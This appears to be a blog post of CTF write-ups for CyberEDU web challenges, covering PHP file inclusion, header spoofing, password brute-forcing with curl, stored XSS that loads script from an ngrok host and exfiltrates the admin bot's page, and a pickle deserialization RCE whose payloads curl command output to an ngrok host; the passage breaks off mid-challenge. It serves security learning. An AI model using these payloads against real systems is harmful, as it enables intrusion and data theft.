@@ -1,0 +1,781 @@
+<!DOCTYPE html><html lang="en"><head>
+    
+      <title>
+        CyberEDU&#39;s Web challenges&#39; writeups ::
+        jorgectf — blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="description" content="CyberEDU&amp;rsquo;s Web challenges&#39; writeups."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://jorgectf.gitlab.io/blog/post/cyberedu-web-challenges/"/>
+
+
+
+
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/assets/style.css"/>
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/style.css"/>
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jorgectf.gitlab.io/blog/img/apple-touch-icon-144-precomposed.png"/>
+<link rel="shortcut icon" href="https://jorgectf.gitlab.io/blog/img/favicon.png"/>
+
+
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CyberEDU&#39;s Web challenges&#39; writeups"/>
+<meta name="twitter:description" content="CyberEDU’s Web challenges&#39; writeups."/>
+
+
+
+<meta property="og:title" content="CyberEDU&#39;s Web challenges&#39; writeups"/>
+<meta property="og:description" content="CyberEDU’s Web challenges&#39; writeups."/>
+<meta property="og:type" content="article"/>
+<meta property="og:url" content="https://jorgectf.gitlab.io/blog/post/cyberedu-web-challenges/"/><meta property="article:section" content="post"/>
+<meta property="article:published_time" content="2021-09-26T00:00:00+00:00"/>
+<meta property="article:modified_time" content="2021-09-26T00:00:00+00:00"/><meta property="og:site_name" content="jorgectf"/>
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+    
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+  </ul>
+</nav>
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">CyberEDU’s Web challenges&#39; writeups</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2021-09-26
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/ctf/">#CTF</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/cyberedu/">#CyberEDU</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/web/">#Web</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/php/">#PHP</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/lfi/">#LFI</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/oob/">#OOB</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/pickle/">#Pickle</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/code-injection/">#Code Injection</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/loose-comparison/">#Loose Comparison</a> 
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>~ Sorted by difficulty (<code>sortBy=easiest</code>) ~</p>
+<ul>
+<li><a href="#alien-inclusion">alien-inclusion</a></li>
+<li><a href="#address">address</a></li>
+<li><a href="#broken-login">broken-login</a></li>
+<li><a href="#manual-review">manual-review</a></li>
+<li><a href="#rundown">rundown</a></li>
+<li><a href="#slightly-broken">slightly-broken</a></li>
+<li><a href="#ping-station">ping-station</a></li>
+<li><a href="#downloader-v1">downloader-v1</a></li>
+<li><a href="#puzzled">puzzled</a></li>
+</ul>
+<h1 id="alien-inclusion">alien-inclusion</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;start&#39;</span>])){
+    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
+    <span style="color:#66d9ef">exit</span>;
+} 
+
+<span style="color:#66d9ef">include</span> ($_POST[<span style="color:#e6db74">&#39;start&#39;</span>]);
+<span style="color:#66d9ef">echo</span> $secret;
+</code></pre></div><p>Since the description tells us the flag is at <code>/var/www/html/flag.php</code> we may think POSTing that path will return the flag.
+In this case it does, because by including <code>/var/www/html/flag.php</code>, <code>$secret</code> gets declared as the flag and then echoed.</p>
+<p>(<code>/?start</code> -&gt; <code>if (!isset($_GET[&#39;start&#39;]))</code>)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /?start <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">34.141.31.183:31166</span>
+<span style="color:#960050;background-color:#1e0010">...</span>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+
+start=php://filter/convert.base64-encode/resource=/var/www/html/flag.php
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
+    $secret<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ctf{b513ef6d1a5735810bca608be42bda8ef28840ee458df4a3508d25e4b706134d}&#34;</span>;
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Also tried to get the flag in plaintext by using <code>php://filter/resource=/var/www/html/flag.php</code>. The thing is, the filter does return the contents in plaintext, but <code>include()</code> parses it and just returns the flag (<code>echo $secret</code>).</p>
+<p>Read more about PHP’s filters <a href="https://www.php.net/manual/en/filters.php" target="_blank">here</a>.</p>
+<h1 id="address">address</h1>
+<p><code>/</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;&lt;<span style="color:#f92672">head</span>&gt;&lt;/<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">body</span>&gt;&lt;<span style="color:#f92672">center</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:image/jpeg;base64,data&#34;</span>&gt;&lt;/<span style="color:#f92672">center</span>&gt; <span style="color:#75715e">&lt;!-- /admin.php --&gt;</span>&lt;/<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p><code>/admin.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;&lt;<span style="color:#f92672">head</span>&gt;&lt;/<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">body</span>&gt;&lt;<span style="color:#f92672">center</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:image/jpeg;base64,data&#34;</span>&gt;&lt;/<span style="color:#f92672">center</span>&gt;<span style="color:#75715e">&lt;!-- You are not a local! --&gt;</span>&lt;/<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>A misconfigured server/rev proxy may set the remote address as <code>X-Forwarded-For</code> header’s value.</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/cyberedu/134804860-17319c0d-8710-4b41-a83a-e1f58e0e447e.png" alt="imagen"/></p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/cyberedu/134804877-910aa672-0c47-47cf-ba24-3d9124b70dea.png" alt="imagen"/></p>
+<h1 id="broken-login">broken-login</h1>
+<p>We are given a simple login page:</p>
+<img width="555" alt="imagen" src="https://jorgectf.gitlab.io/blog/static/cyberedu/137560927-d448d066-d8e0-4600-8ed4-424e3bf745ba.png"/>
+<p>This form POSTs <code>/login</code> who returns a redirect to <code>/auth</code> with the username in hex and the password in sha512. However, the request to <code>/login</code> uses <code>name</code> while the one to <code>/auth</code> uses <code>username</code>. Changing <code>/auth</code> to use <code>name</code> makes the webapp return an <code>Invalid user</code>. Using <code>Alex</code> as challenge’s description suggests and fuzzing with <code>rockyou.txt</code> leads us to the final stage:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /opt/wordlists/rockyou.txt | <span style="color:#66d9ef">while</span> read line; <span style="color:#66d9ef">do</span> echo -n <span style="color:#e6db74">&#34;Trying </span>$line<span style="color:#e6db74">: &#34;</span>; curl <span style="color:#e6db74">&#34;http://mirror/auth?name=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#39;Alex&#39;</span> | xxd -p<span style="color:#66d9ef">)</span><span style="color:#e6db74">&amp;password=</span><span style="color:#66d9ef">$(</span>echo -n $line | shasum -a <span style="color:#ae81ff">512</span> | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f1<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>; echo; <span style="color:#66d9ef">done</span>
+</code></pre></div><p>Valid creds are <code>Alex:juliana</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~/Desktop/CTF &gt; curl <span style="color:#e6db74">&#34;http://mirror/auth?name=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#39;Alex&#39;</span> | xxd -p<span style="color:#66d9ef">)</span><span style="color:#e6db74">&amp;password=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#39;juliana&#39;</span> | shasum -a <span style="color:#ae81ff">512</span> | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f1<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/internal&#34;</span>&gt;Found&lt;/a&gt;.
+
+~/Desktop/CTF &gt; curl <span style="color:#e6db74">&#34;http://mirror/auth?name=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#39;Alex&#39;</span> | xxd -p<span style="color:#66d9ef">)</span><span style="color:#e6db74">&amp;password=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#39;juliana&#39;</span> | shasum -a <span style="color:#ae81ff">512</span> | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f1<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> -v
+*   Trying mirror...
+* TCP_NODELAY set
+* Connected to mirror <span style="color:#f92672">(</span>mirror<span style="color:#f92672">)</span> port XXXXX <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+&gt; GET /auth?name<span style="color:#f92672">=</span>416c6578&amp;password<span style="color:#f92672">=</span>98fba6446189574b3dac42a3a418efc22552fd057c1bcef1e6e6115390030e22cdf7eecedd176a959d84fabb738fb1714226bad3ac7449816503d63def1b3460 HTTP/1.1
+&gt; Host: mirror
+&gt; User-Agent: curl/7.64.1
+&gt; Accept: */*
+&gt;
+&lt; HTTP/1.1 <span style="color:#ae81ff">302</span> Found
+&lt; Location: /internal
+&lt; Set-Cookie: session<span style="color:#f92672">=</span>data; Path<span style="color:#f92672">=</span>/
+&lt; Date: Fri, <span style="color:#ae81ff">15</span> Oct <span style="color:#ae81ff">2021</span> 22:34:34 GMT
+&lt; Content-Length: <span style="color:#ae81ff">32</span>
+&lt; Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+&lt;
+&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/internal&#34;</span>&gt;Found&lt;/a&gt;.
+
+* Connection <span style="color:#75715e">#0 to host mirror left intact</span>
+* Closing connection <span style="color:#ae81ff">0</span>
+~/Desktop/CTF &gt; curl http://mirror/internal -b <span style="color:#e6db74">&#34;session=data&#34;</span> -v
+*   Trying mirror...
+* TCP_NODELAY set
+* Connected to mirror <span style="color:#f92672">(</span>mirror<span style="color:#f92672">)</span> port <span style="color:#ae81ff">30267</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+&gt; GET /internal HTTP/1.1
+&gt; Host: mirror
+&gt; User-Agent: curl/7.64.1
+&gt; Accept: */*
+&gt; Cookie: session<span style="color:#f92672">=</span>data
+&gt;
+&lt; HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+&lt; Date: Fri, <span style="color:#ae81ff">15</span> Oct <span style="color:#ae81ff">2021</span> 22:35:15 GMT
+&lt; Content-Length: <span style="color:#ae81ff">237</span>
+&lt; Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+&lt;
+
+&lt;h1&gt;Internal&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt; Talk about insecure and broken login pages... CTF<span style="color:#f92672">{</span>bf3dd66e1c8e91683070d17ec2afb13375488eee109a0724bb872c9d70b7cc3d<span style="color:#f92672">}</span>
+&lt;/p&gt;
+&lt;form method<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/logout&#34;</span>&gt;
+    &lt;button type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span>&gt;Logout&lt;/button&gt;
+&lt;/form&gt;
+* Connection <span style="color:#75715e">#0 to host mirror left intact</span>
+* Closing connection <span style="color:#ae81ff">0</span>
+</code></pre></div><h1 id="manual-review">manual-review</h1>
+<p>We get an input to ‘leave’ a message for an admin.</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/cyberedu/134806516-5b7c1adc-7b6c-4dfe-9bfc-977ccc1b9e0f.png" alt="imagen"/></p>
+<p>Once we send it, it shows an <code>Assigned</code> status. Then it changes to <code>Solved</code> once (I guess) backend’s (I guess) selenium driver visits our message.</p>
+<p>To leak what the admin is seeing, we should try to inject js.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;py-12&#34;</span>&gt;
+    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;max-w-7xl mx-auto sm:px-6 lg:px-8&#34;</span>&gt;
+      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bg-white overflow-hidden shadow-xl sm:rounded-lg&#34;</span>&gt;
+        &lt;<span style="color:#f92672">h1</span>&gt;1 / Status: Solved&lt;/<span style="color:#f92672">h1</span>&gt;
+        &lt;<span style="color:#f92672">hr</span>&gt;
+        &lt;<span style="color:#f92672">p</span>&gt;&#34;&gt;test&lt;/<span style="color:#f92672">p</span>&gt;
+      &lt;/<span style="color:#f92672">div</span>&gt;
+    &lt;/<span style="color:#f92672">div</span>&gt;
+&lt;/<span style="color:#f92672">div</span>&gt;
+</code></pre></div><p>Our input gets no sanitization, so it’s as easy as creating a <code>&lt;script&gt;</code> and making requests to our server.</p>
+<p>Let’s send this as message <code>&lt;script src=&#34;https://x.ngrok.io/exfil.js&#34;&gt;&lt;/script&gt;</code> and create an <code>exfil.js</code> file in our server to edit the js code the backend’s selenium is going to execute more easily.</p>
+<p>Trying first to leak the entire document’s HTML:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exfil</span>(<span style="color:#a6e22e">data</span>) {
+    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://x.ngrok.io/exfil&#39;</span>, {
+        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+        <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>,
+        <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span>
+    })
+}
+
+(<span style="color:#66d9ef">async</span> () =&gt; {
+    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">exfil</span>(document.<span style="color:#a6e22e">documentElement</span>.<span style="color:#a6e22e">innerHTML</span>)
+})();
+</code></pre></div><p><img src="https://jorgectf.gitlab.io/blog/static/cyberedu/134809231-3a2391e8-ac65-436b-898f-7e98e2312f2f.png" alt="imagen"/></p>
+<p>That’s how the admin bot sees our report, but the flag is in the user agent this time.</p>
+<h1 id="rundown">rundown</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=utf-8</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">50</span>
+Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Werkzeug/1.0.1 Python/2.7.12</span>
+
+APIv2 @ 2020 - You think you got methods for this?
+</code></pre></div><p>No <code>robots.txt</code>, so let’s try an <code>OPTIONS</code> request to see which methods are allowed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=utf-8</span>
+Allow<span style="color:#f92672">:</span> <span style="color:#ae81ff">POST, HEAD, OPTIONS, GET</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
+Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Werkzeug/1.0.1 Python/2.7.12</span>
+</code></pre></div><p>A <code>HEAD</code> request shows nothing, but <code>POST</code>ing returns <a href="https://nickjanetakis.com/blog/enabling-the-flask-interactive-debugger-in-development-with-gunicorn" target="_blank">Flask&amp;rsquo;s debug console</a>.</p>
+<p>At first, it seems we’ll have to generate the PIN with <a href="https://www.daehee.com/werkzeug-console-pin-exploit/" target="_blank">this technique</a>, however, we have no way to read the private files needed.
+After looking at the trackeback, there’s a very suspicious code shown:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">newpost</span>():
+  picklestr <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64decode(request<span style="color:#f92672">.</span>data)
+  <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">in</span> picklestr:
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;The &#39; &#39; is blacklisted!&#34;</span>
+  postObj <span style="color:#f92672">=</span> cPickle<span style="color:#f92672">.</span>loads(picklestr)
+  <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
+</code></pre></div><p>This is a flask endpoint using <a href="https://docs.python.org/3/library/pickle.html" target="_blank">pickle</a>.</p>
+<p>Refer to <a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/" target="_blank">this article</a> to understand how to exploit this vulnerability.
+Basically, we’ll be creating a class with a <code>__reduce__</code> method who will then be pickled and encoded for the server to decode it and unpickle it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> pickle
+<span style="color:#f92672">import</span> base64
+<span style="color:#f92672">import</span> os
+
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RCE</span>:
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+        <span style="color:#66d9ef">return</span> os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#39;curl -X POST http://c4e7-151-182-150-4.ngrok.io -d &#34;$(ls)&#34;&#39;</span>,)
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    pickled <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(RCE())
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Raw: </span><span style="color:#e6db74">{</span>pickled<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Base64: </span><span style="color:#e6db74">{</span>base64<span style="color:#f92672">.</span>urlsafe_b64encode(pickled)<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</code></pre></div><pre tabindex="0"><code>Raw: b&#39;\x80\x04\x95U\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c:curl -X POST http://c4e7-151-182-150-4.ngrok.io -d &#34;$(ls)&#34;\x94\x85\x94R\x94.&#39;
+Base64: gASVVQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDpjdXJsIC1YIFBPU1QgaHR0cDovL2M0ZTctMTUxLTE4Mi0xNTAtNC5uZ3Jvay5pbyAtZCAiJChscykilIWUUpQu
+</code></pre><p>However, according to <code>if &#34; &#34; in picklestr:</code>, the command must have no spaces. For that we’ll be using the <code>${IFS}</code> <a href="https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions" target="_blank">technique</a>.</p>
+<p>Let’s make the exploit to be easier to change the command to execute:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> pickle
+<span style="color:#f92672">import</span> base64
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> requests
+
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://mirror/&#34;</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RCE</span>(object):
+    <span style="color:#66d9ef">def</span> __init__(self, cmd):
+        self<span style="color:#f92672">.</span>cmd <span style="color:#f92672">=</span> cmd
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+        <span style="color:#66d9ef">return</span> os<span style="color:#f92672">.</span>system, (self<span style="color:#f92672">.</span>cmd,)
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+        cmd <span style="color:#f92672">=</span> raw_input(<span style="color:#e6db74">&#39;$ &#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;$</span><span style="color:#e6db74">{IFS}</span><span style="color:#e6db74">&#39;</span>)
+        pickled <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(RCE(cmd))
+        b64 <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(pickled)<span style="color:#f92672">.</span>decode()
+        print(<span style="color:#e6db74">&#34;Raw: &#34;</span>, pickled)
+        print(<span style="color:#e6db74">&#34;Base64: &#34;</span>, b64)
+
+        print(requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>b64)<span style="color:#f92672">.</span>text)
+
+</code></pre></div><p>The POC must be in Python2 (<code>Server: Werkzeug/1.0.1 Python/2.7.12</code>).</p>
+<p>Without being able to leak anything to our server (the box seems not to have outbounds connection) we can make a time-based leak.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">└─#rlwrap python poc.py
+a
+<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Raw: &#39;</span>, <span style="color:#e6db74">&#34;cposix\nsystem\np0\n(S&#39;a&#39;\np1\ntp2\nRp3\n.&#34;</span><span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Base64: &#39;</span>, u<span style="color:#e6db74">&#39;Y3Bvc2l4CnN5c3RlbQpwMAooUydhJwpwMQp0cDIKUnAzCi4=&#39;</span><span style="color:#f92672">)</span>
+0:00:00.088122
+sleep <span style="color:#ae81ff">10</span>
+<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Raw: &#39;</span>, <span style="color:#e6db74">&#34;cposix\nsystem\np0\n(S&#39;sleep</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">10&#39;\np1\ntp2\nRp3\n.&#34;</span><span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Base64: &#39;</span>, u<span style="color:#e6db74">&#39;Y3Bvc2l4CnN5c3RlbQpwMAooUydzbGVlcCR7SUZTfTEwJwpwMQp0cDIKUnAzCi4=&#39;</span><span style="color:#f92672">)</span>
+0:00:10.090024
+ls | grep flag <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">5</span>
